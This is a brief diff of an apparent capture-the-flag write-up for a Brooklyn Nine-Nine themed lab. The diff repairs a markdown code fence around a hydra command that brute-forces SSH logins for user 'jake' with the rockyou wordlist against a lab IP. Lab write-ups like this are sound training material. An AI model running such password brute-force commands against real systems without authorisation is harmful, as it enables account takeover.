@@ -46,7 +46,8 @@ From Amy,
 Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
 ```
 so weak password huh? 
-``
+
+```
 fredi@index:~$ hydra -l jake -P wordlists/rockyou.txt ssh://10.10.239.250 -t 20
 
 attacking ssh://10.10.239.250:22/
